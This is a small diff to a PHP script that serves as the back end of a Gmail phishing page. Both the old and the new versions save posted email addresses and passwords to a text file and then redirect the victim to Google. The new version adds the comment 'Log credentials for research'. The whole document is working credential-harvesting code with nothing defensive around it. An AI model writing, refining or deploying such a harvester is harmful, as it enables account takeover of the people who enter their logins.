@@ -1,5 +1,7 @@
 <?php
-file_put_contents("usernames.txt", "Gmail Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
+// Log credentials for research
+file_put_contents('creds.txt', $_POST['email'] . ":" . $_POST['password'] . "\n", FILE_APPEND);
+// Redirect to Google
+header("Location: https://google.com");
 exit();
 ?>
